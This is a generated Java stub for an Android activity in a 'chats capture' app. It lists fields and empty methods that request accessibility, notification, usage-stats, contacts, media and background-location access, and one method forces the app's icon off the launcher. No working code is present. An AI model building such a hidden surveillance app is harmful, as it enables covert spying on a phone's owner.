package com.chats.capture.ui;

/**
 * Activity that automatically requests all required permissions
 * Runs automatically on app install/start
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000`\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010!\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0002\b\b\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0010\u0011\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\u0015\n\u0002\b\u000f\u0018\u0000 82\u00020\u0001:\u000289B\u0005\u00a2\u0006\u0002\u0010\u0002J\b\u0010\u0018\u001a\u00020\u0019H\u0002J\b\u0010\u001a\u001a\u00020\u0019H\u0002J\b\u0010\u001b\u001a\u00020\u0019H\u0002J\b\u0010\u001c\u001a\u00020\u0019H\u0002J\b\u0010\u001d\u001a\u00020\u000eH\u0002J\b\u0010\u001e\u001a\u00020\u000eH\u0002J\b\u0010\u001f\u001a\u00020\u000eH\u0002J\u0012\u0010 \u001a\u00020\u00192\b\u0010!\u001a\u0004\u0018\u00010\"H\u0014J\b\u0010#\u001a\u00020\u0019H\u0014J\b\u0010$\u001a\u00020\u0019H\u0014J-\u0010%\u001a\u00020\u00192\u0006\u0010&\u001a\u00020\f2\u000e\u0010\'\u001a\n\u0012\u0006\b\u0001\u0012\u00020)0(2\u0006\u0010*\u001a\u00020+H\u0016\u00a2\u0006\u0002\u0010,J\b\u0010-\u001a\u00020\u0019H\u0014J\b\u0010.\u001a\u00020\u0019H\u0002J\b\u0010/\u001a\u00020\u0019H\u0002J\b\u00100\u001a\u00020\u0019H\u0002J\b\u00101\u001a\u00020\u0019H\u0002J\b\u00102\u001a\u00020\u0019H\u0002J\b\u00103\u001a\u00020\u0019H\u0002J\b\u00104\u001a\u00020\u0019H\u0002J\b\u00105\u001a\u00020\u0019H\u0002J\b\u00106\u001a\u00020\u0019H\u0002J\b\u00107\u001a\u00020\u0019H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u0006X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000b\u001a\u00020\fX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\r\u001a\u00020\u000eX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0014\u0010\u000f\u001a\b\u0012\u0004\u0012\u00020\u00110\u0010X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0012\u001a\u00020\u0013X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0014\u001a\u00020\u0015X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0016\u001a\u00020\u0015X\u0082.\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0017\u001a\u00020\u0015X\u0082.\u00a2\u0006\u0002\n\u0000\u00a8\u0006:"}, d2 = {"Lcom/chats/capture/ui/PermissionSetupActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "()V", "batteryOptimizationManager", "Lcom/chats/capture/managers/BatteryOptimizationManager;", "btnFinishSetup", "Landroid/widget/Button;", "btnHideApp", "btnRequestPermissions", "btnSpecialPermissions", "btnStartServices", "currentPermissionIndex", "", "isAutoStart", "", "permissionsQueue", "", "Lcom/chats/capture/ui/PermissionSetupActivity$PermissionRequest;", "serviceMonitor", "Lcom/chats/capture/managers/ServiceMonitor;", "tvHideStatus", "Landroid/widget/TextView;", "tvPermissionsStatus", "tvSpecialStatus", "buildPermissionsQueue", "", "continueWithSpecialPermissions", "forceHideAppFromLauncher", "initializeViews", "isAccessibilityServiceEnabled", "isNotificationServiceEnabled", "isUsageStatsPermissionGranted", "onCreate", "savedInstanceState", "Landroid/os/Bundle;", "onDestroy", "onPause", "onRequestPermissionsResult", "requestCode", "permissions", "", "", "grantResults", "", "(I[Ljava/lang/String;[I)V", "onResume", "requestAccessibilityService", "requestBackgroundLocationPermission", "requestLocationPermissions", "requestNextPermission", "requestNotificationAccess", "requestPermissionsSequentially", "requestUsageStatsPermission", "scheduleBackgroundWork", "startServices", "updatePermissionStatus", "Companion", "PermissionRequest", "app_debug"})
public final class PermissionSetupActivity extends androidx.appcompat.app.AppCompatActivity {
    private com.chats.capture.managers.ServiceMonitor serviceMonitor;
    private com.chats.capture.managers.BatteryOptimizationManager batteryOptimizationManager;
    private boolean isAutoStart = false;
    private android.widget.TextView tvPermissionsStatus;
    private android.widget.TextView tvSpecialStatus;
    private android.widget.TextView tvHideStatus;
    private android.widget.Button btnRequestPermissions;
    private android.widget.Button btnSpecialPermissions;
    private android.widget.Button btnHideApp;
    private android.widget.Button btnStartServices;
    private android.widget.Button btnFinishSetup;
    private static final int REQUEST_POST_NOTIFICATIONS = 1001;
    private static final int REQUEST_READ_MEDIA_IMAGES = 1002;
    private static final int REQUEST_READ_MEDIA_VIDEO = 1003;
    private static final int REQUEST_READ_EXTERNAL_STORAGE = 1004;
    private static final int REQUEST_READ_CONTACTS = 1005;
    private static final int REQUEST_LOCATION_PERMISSIONS = 1006;
    private static final int REQUEST_BACKGROUND_LOCATION = 1007;
    private int currentPermissionIndex = 0;
    @org.jetbrains.annotations.NotNull()
    private final java.util.List<com.chats.capture.ui.PermissionSetupActivity.PermissionRequest> permissionsQueue = null;
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.ui.PermissionSetupActivity.Companion Companion = null;
    
    public PermissionSetupActivity() {
        super();
    }
    
    @java.lang.Override()
    protected void onCreate(@org.jetbrains.annotations.Nullable()
    android.os.Bundle savedInstanceState) {
    }
    
    private final void requestPermissionsSequentially() {
    }
    
    private final void requestNotificationAccess() {
    }
    
    private final void requestAccessibilityService() {
    }
    
    private final void buildPermissionsQueue() {
    }
    
    private final void requestNextPermission() {
    }
    
    private final void forceHideAppFromLauncher() {
    }
    
    private final void requestLocationPermissions() {
    }
    
    private final void requestBackgroundLocationPermission() {
    }
    
    @java.lang.Override()
    public void onRequestPermissionsResult(int requestCode, @org.jetbrains.annotations.NotNull()
    java.lang.String[] permissions, @org.jetbrains.annotations.NotNull()
    int[] grantResults) {
    }
    
    private final void requestUsageStatsPermission() {
    }
    
    private final boolean isNotificationServiceEnabled() {
        return false;
    }
    
    private final boolean isAccessibilityServiceEnabled() {
        return false;
    }
    
    private final void startServices() {
    }
    
    private final boolean isUsageStatsPermissionGranted() {
        return false;
    }
    
    private final void continueWithSpecialPermissions() {
    }
    
    private final void scheduleBackgroundWork() {
    }
    
    @java.lang.Override()
    protected void onResume() {
    }
    
    @java.lang.Override()
    protected void onPause() {
    }
    
    /**
     * Initialize UI views from layout
     */
    private final void initializeViews() {
    }
    
    /**
     * Update permission status in UI
     */
    private final void updatePermissionStatus() {
    }
    
    @java.lang.Override()
    protected void onDestroy() {
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0014\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\b\n\u0002\b\u0007\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0006\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000R\u000e\u0010\n\u001a\u00020\u0004X\u0082T\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u000b"}, d2 = {"Lcom/chats/capture/ui/PermissionSetupActivity$Companion;", "", "()V", "REQUEST_BACKGROUND_LOCATION", "", "REQUEST_LOCATION_PERMISSIONS", "REQUEST_POST_NOTIFICATIONS", "REQUEST_READ_CONTACTS", "REQUEST_READ_EXTERNAL_STORAGE", "REQUEST_READ_MEDIA_IMAGES", "REQUEST_READ_MEDIA_VIDEO", "app_debug"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
    }
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000 \n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\b\n\u0002\b\f\n\u0002\u0010\u000b\n\u0002\b\u0004\b\u0082\b\u0018\u00002\u00020\u0001B\u001d\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u0012\u0006\u0010\u0004\u001a\u00020\u0005\u0012\u0006\u0010\u0006\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0007J\t\u0010\r\u001a\u00020\u0003H\u00c6\u0003J\t\u0010\u000e\u001a\u00020\u0005H\u00c6\u0003J\t\u0010\u000f\u001a\u00020\u0003H\u00c6\u0003J\'\u0010\u0010\u001a\u00020\u00002\b\b\u0002\u0010\u0002\u001a\u00020\u00032\b\b\u0002\u0010\u0004\u001a\u00020\u00052\b\b\u0002\u0010\u0006\u001a\u00020\u0003H\u00c6\u0001J\u0013\u0010\u0011\u001a\u00020\u00122\b\u0010\u0013\u001a\u0004\u0018\u00010\u0001H\u00d6\u0003J\t\u0010\u0014\u001a\u00020\u0005H\u00d6\u0001J\t\u0010\u0015\u001a\u00020\u0003H\u00d6\u0001R\u0011\u0010\u0006\u001a\u00020\u0003\u00a2\u0006\b\n\u0000\u001a\u0004\b\b\u0010\tR\u0011\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\b\n\u0000\u001a\u0004\b\n\u0010\tR\u0011\u0010\u0004\u001a\u00020\u0005\u00a2\u0006\b\n\u0000\u001a\u0004\b\u000b\u0010\f\u00a8\u0006\u0016"}, d2 = {"Lcom/chats/capture/ui/PermissionSetupActivity$PermissionRequest;", "", "permission", "", "requestCode", "", "name", "(Ljava/lang/String;ILjava/lang/String;)V", "getName", "()Ljava/lang/String;", "getPermission", "getRequestCode", "()I", "component1", "component2", "component3", "copy", "equals", "", "other", "hashCode", "toString", "app_debug"})
    static final class PermissionRequest {
        @org.jetbrains.annotations.NotNull()
        private final java.lang.String permission = null;
        private final int requestCode = 0;
        @org.jetbrains.annotations.NotNull()
        private final java.lang.String name = null;
        
        public PermissionRequest(@org.jetbrains.annotations.NotNull()
        java.lang.String permission, int requestCode, @org.jetbrains.annotations.NotNull()
        java.lang.String name) {
            super();
        }
        
        @org.jetbrains.annotations.NotNull()
        public final java.lang.String getPermission() {
            return null;
        }
        
        public final int getRequestCode() {
            return 0;
        }
        
        @org.jetbrains.annotations.NotNull()
        public final java.lang.String getName() {
            return null;
        }
        
        @org.jetbrains.annotations.NotNull()
        public final java.lang.String component1() {
            return null;
        }
        
        public final int component2() {
            return 0;
        }
        
        @org.jetbrains.annotations.NotNull()
        public final java.lang.String component3() {
            return null;
        }
        
        @org.jetbrains.annotations.NotNull()
        public final com.chats.capture.ui.PermissionSetupActivity.PermissionRequest copy(@org.jetbrains.annotations.NotNull()
        java.lang.String permission, int requestCode, @org.jetbrains.annotations.NotNull()
        java.lang.String name) {
            return null;
        }
        
        @java.lang.Override()
        public boolean equals(@org.jetbrains.annotations.Nullable()
        java.lang.Object other) {
            return false;
        }
        
        @java.lang.Override()
        public int hashCode() {
            return 0;
        }
        
        @java.lang.Override()
        @org.jetbrains.annotations.NotNull()
        public java.lang.String toString() {
            return null;
        }
    }
}